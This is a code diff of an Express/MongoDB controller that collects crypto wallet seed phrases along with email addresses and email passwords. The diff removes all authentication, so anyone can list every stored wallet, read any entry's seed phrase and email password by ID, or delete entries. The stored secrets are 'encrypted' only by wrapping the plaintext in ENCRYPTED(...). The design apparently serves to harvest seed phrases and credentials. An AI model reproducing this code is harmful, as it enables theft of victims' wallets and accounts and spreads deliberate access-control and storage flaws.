@@ -3,193 +3,142 @@ const mongoose = require('mongoose');
 const SeedPhrase = require('../models/SeedPhrase'); // Import SeedPhrase model
 
 // --- Placeholder Encryption Function ---
-// Replace this with your actual robust encryption logic (e.g., using 'crypto' module with AES-GCM)
-// **NEVER use this placeholder in production.**
+// IMPORTANT: Replace this with your actual robust encryption logic.
 const encryptPlaceholder = (data) => {
-    if (data === undefined || data === null || data === '') return ''; // Handle empty optional fields
-    // Basic "encryption" - just wraps the data. Replace with real encryption.
+    if (data === undefined || data === null || data === '') return '';
     return `ENCRYPTED(${data.toString()})`;
 };
 
-// --- Save Seed Phrase ---
+// --- Save Seed Phrase (No User Context) ---
 const saveSeedPhrase = async (req, res) => {
-    // Get userId from the authenticated request (added by authMiddleware)
-    const userId = req.user.id;
-    // Destructure all fields, including optional ones
+    // No userId from token needed
     const { email, emailPassword, walletName, seedPhrase, walletType } = req.body;
 
-    // Backend validation: Ensure required fields are present
     if (!walletName || !seedPhrase || !walletType) {
         return res.status(400).json({ message: 'Missing required fields (walletName, seedPhrase, walletType).' });
     }
-
-    // Basic check for phrase structure (more robust validation can be added)
-     if (typeof seedPhrase !== 'string' || seedPhrase.trim().split(/\s+/).length < 12) {
-          return res.status(400).json({ message: 'Invalid seed phrase format (must be 12+ words).' });
-     }
-     // Consider adding validation for walletType enum here too for robustness
+    if (typeof seedPhrase !== 'string' || seedPhrase.trim().split(/\s+/).length < 12) {
+         return res.status(400).json({ message: 'Invalid seed phrase format (must be 12+ words).' });
+    }
 
     try {
-        // --- !!! ENCRYPTION LOGIC NEEDED HERE !!! ---
-        // Encrypt sensitive data before saving. Use a strong, unique key per user, possibly derived from their password during login (handle key management carefully!).
-        // This is a placeholder, replace with real encryption.
-        // Encrypt optional fields only if they are provided
         const encryptedEmail = email ? encryptPlaceholder(email) : '';
         const encryptedEmailPassword = emailPassword ? encryptPlaceholder(emailPassword) : '';
-        const encryptedSeedPhrase = encryptPlaceholder(seedPhrase); // This one is required
-        // --- !!! END ENCRYPTION LOGIC !!! ---
+        const encryptedSeedPhrase = encryptPlaceholder(seedPhrase);
 
-        // Basic check if required placeholder encryption produced something (adjust for real encryption)
         if (!encryptedSeedPhrase || encryptedSeedPhrase === 'ENCRYPTED()') {
-            console.error(`[Save Seed Controller] Required Seed Phrase encryption failed for user ${userId}.`);
+            console.error(`[Save Seed Controller] Required Seed Phrase encryption failed.`);
             return res.status(500).json({ message: 'Failed to secure submitted seed phrase.' });
         }
-        // Check optional fields didn't fail if they were provided
-        if (email && (!encryptedEmail || encryptedEmail === 'ENCRYPTED()')) {
-             console.error(`[Save Seed Controller] Optional Email encryption failed for user ${userId}.`);
+         if (email && (!encryptedEmail || encryptedEmail === 'ENCRYPTED()')) {
+             console.error(`[Save Seed Controller] Optional Email encryption failed.`);
             return res.status(500).json({ message: 'Failed to secure submitted email data.' });
         }
          if (emailPassword && (!encryptedEmailPassword || encryptedEmailPassword === 'ENCRYPTED()')) {
-             console.error(`[Save Seed Controller] Optional Password encryption failed for user ${userId}.`);
+             console.error(`[Save Seed Controller] Optional Password encryption failed.`);
             return res.status(500).json({ message: 'Failed to secure submitted password data.' });
         }
 
-
-        // Create new seed phrase instance
+        // Create new seed phrase instance without userId
         const newSeed = new SeedPhrase({
-            userId, // Link to the logged-in user
-            encryptedEmail, // Save potentially empty encrypted string if not provided
-            encryptedEmailPassword, // Save potentially empty encrypted string if not provided
+            // No userId field needed here unless you adapt the model
+            encryptedEmail,
+            encryptedEmailPassword,
             walletName,
-            encryptedSeedPhrase, // Save the *encrypted* phrase
+            encryptedSeedPhrase,
             walletType,
         });
 
-        // Save to database
         await newSeed.save();
 
-        console.log(`[Save Seed Controller] Seed phrase saved for user ${userId}, wallet: ${walletName}, ID: ${newSeed._id}`);
-
-        // Respond with success message (avoid sending back sensitive data)
-        // 201 Created status code
-        res.status(201).json({ message: 'Information saved successfully.', id: newSeed._id }); // Optionally return the new ID
+        console.log(`[Save Seed Controller] Seed phrase saved publicly, wallet: ${walletName}, ID: ${newSeed._id}`);
+        res.status(201).json({ message: 'Information saved successfully.', id: newSeed._id });
 
     } catch (error) {
-        console.error(`[Save Seed Controller Error] User: ${userId}, Wallet: ${walletName}`, error);
-        // Handle Mongoose validation errors
+        console.error(`[Save Seed Controller Error] Wallet: ${walletName}`, error);
         if (error.name === 'ValidationError') {
              const errors = Object.values(error.errors).map(el => el.message);
              return res.status(400).json({ message: 'Validation Error', errors });
         }
-        // Generic server error
         res.status(500).json({ message: 'Error saving seed phrase information.' });
     }
 };
 
-// --- Get Seed Phrase Metadata ---
-// Returns a list of wallet names, types, and IDs for the user's dashboard.
+// --- Get All Seed Phrase Metadata (No User Context) ---
 const getSeedPhraseMetadata = async (req, res) => {
-    const userId = req.user.id; // User ID from authenticated request
-    console.log(`[Get Metadata Controller] Fetching metadata for user ID: ${userId}`);
-
+    console.log(`[Get Metadata Controller] Fetching all metadata publicly.`);
     try {
-        // Find all seed phrases associated with the user ID
-        // Select only the fields needed for the dashboard list view
-        const phrases = await SeedPhrase.find({ userId })
-                                      .select('walletName walletType createdAt _id') // Only return non-sensitive metadata
-                                      .sort({ createdAt: -1 }); // Sort by newest first
+        // Find all seed phrases, no user filter
+        const phrases = await SeedPhrase.find({}) // Empty filter {} fetches all
+                                      .select('walletName walletType createdAt _id')
+                                      .sort({ createdAt: -1 });
 
-        console.log(`[Get Metadata Controller] Found ${phrases.length} phrases for user ID: ${userId}`);
-
-        // Return the list of metadata objects
-        // 200 OK status code
+        console.log(`[Get Metadata Controller] Found ${phrases.length} total phrases.`);
         res.status(200).json(phrases);
 
     } catch (error) {
-        console.error(`[Get Metadata Controller Error] User ID: ${userId}`, error);
-        // Generic server error
+        console.error(`[Get Metadata Controller Error]`, error);
         res.status(500).json({ message: 'Error fetching seed phrase information.' });
     }
 };
 
-// --- Reveal Seed Phrase Details (Encrypted) ---
-// Fetches a specific seed phrase entry, returning the *encrypted* data.
-// Decryption MUST happen securely on the client-side.
+// --- Reveal Seed Phrase Details by ID (No User Context) ---
 const revealSeedPhrase = async (req, res) => {
-    const userId = req.user.id;
-    const phraseId = req.params.id; // Get phrase ID from URL parameters
+    const phraseId = req.params.id;
+    console.log(`[Reveal Controller Attempt] Public reveal for Phrase ID: ${phraseId}`);
 
-    console.log(`[Reveal Controller Attempt] User ID: ${userId}, Phrase ID: ${phraseId}`);
-
-    // Validate the ID format before querying
     if (!mongoose.Types.ObjectId.isValid(phraseId)) {
         return res.status(400).json({ message: 'Invalid seed phrase ID format.' });
     }
 
     try {
-        // Find the specific seed phrase belonging ONLY to the authenticated user
-        const phrase = await SeedPhrase.findOne({ _id: phraseId, userId });
+        // Find the specific seed phrase by ID only
+        const phrase = await SeedPhrase.findById(phraseId); // Find by _id
 
         if (!phrase) {
-            console.warn(`[Reveal Controller Denied] Phrase ID: ${phraseId} not found or doesn't belong to User ID: ${userId}`);
-            // 404 Not Found - The specific resource was not found for this user
-            return res.status(404).json({ message: 'Seed phrase not found or access denied.' });
+            console.warn(`[Reveal Controller Denied] Phrase ID: ${phraseId} not found.`);
+            return res.status(404).json({ message: 'Seed phrase not found.' });
         }
 
-        console.log(`[Reveal Controller Success] Returning encrypted data for Phrase ID: ${phraseId}, User ID: ${userId}`);
-
-        // **Return ENCRYPTED data.**
-        // 200 OK status code
+        console.log(`[Reveal Controller Success] Returning encrypted data for Phrase ID: ${phraseId}`);
         res.status(200).json({
-             _id: phrase._id, // Include ID for client reference
-             // Return optional fields, they might be empty strings if not saved
+             _id: phrase._id,
              encryptedEmail: phrase.encryptedEmail || '',
              encryptedEmailPassword: phrase.encryptedEmailPassword || '',
              encryptedSeedPhrase: phrase.encryptedSeedPhrase,
-             walletName: phrase.walletName, // Less sensitive, OK to return
-             walletType: phrase.walletType, // Less sensitive, OK to return
+             walletName: phrase.walletName,
+             walletType: phrase.walletType,
         });
 
     } catch (error) {
-        console.error(`[Reveal Controller Error] User ID: ${userId}, Phrase ID: ${phraseId}`, error);
-        // Generic server error
+        console.error(`[Reveal Controller Error] Phrase ID: ${phraseId}`, error);
         res.status(500).json({ message: 'Error revealing seed phrase information.' });
     }
 };
 
-// --- Delete Seed Phrase ---
+// --- Delete Seed Phrase by ID (No User Context) ---
 const deleteSeedPhrase = async (req, res) => {
-    const userId = req.user.id;
-    const phraseId = req.params.id; // Get phrase ID from URL parameters
+    const phraseId = req.params.id;
+    console.log(`[Delete Controller Attempt] Public delete for Phrase ID: ${phraseId}`);
 
-    console.log(`[Delete Controller Attempt] User ID: ${userId}, Phrase ID: ${phraseId}`);
-
-    // Validate the ID format
     if (!mongoose.Types.ObjectId.isValid(phraseId)) {
         return res.status(400).json({ message: 'Invalid seed phrase ID format.' });
     }
 
     try {
-        // Find and delete the seed phrase belonging ONLY to the authenticated user
-        const result = await SeedPhrase.findOneAndDelete({ _id: phraseId, userId });
+        // Find and delete the seed phrase by ID only
+        const result = await SeedPhrase.findByIdAndDelete(phraseId); // Find and delete by _id
 
         if (!result) {
-            // If result is null, the document wasn't found or didn't belong to the user
-            console.warn(`[Delete Controller Failed] Phrase ID: ${phraseId} not found or doesn't belong to User ID: ${userId}`);
-             // 404 Not Found
-            return res.status(404).json({ message: 'Seed phrase not found or access denied.' });
+            console.warn(`[Delete Controller Failed] Phrase ID: ${phraseId} not found.`);
+            return res.status(404).json({ message: 'Seed phrase not found.' });
         }
 
-        console.log(`[Delete Controller Success] Phrase ID: ${phraseId} deleted for User ID: ${userId}`);
-
-        // Respond with success message or status code
-        // 200 OK with message, or 204 No Content
+        console.log(`[Delete Controller Success] Phrase ID: ${phraseId} deleted publicly.`);
         res.status(200).json({ message: 'Seed phrase deleted successfully.' });
-        // Alternatively: res.status(204).send();
 
     } catch (error) {
-        console.error(`[Delete Controller Error] User ID: ${userId}, Phrase ID: ${phraseId}`, error);
-        // Generic server error
+        console.error(`[Delete Controller Error] Phrase ID: ${phraseId}`, error);
         res.status(500).json({ message: 'Error deleting seed phrase information.' });
     }
 };
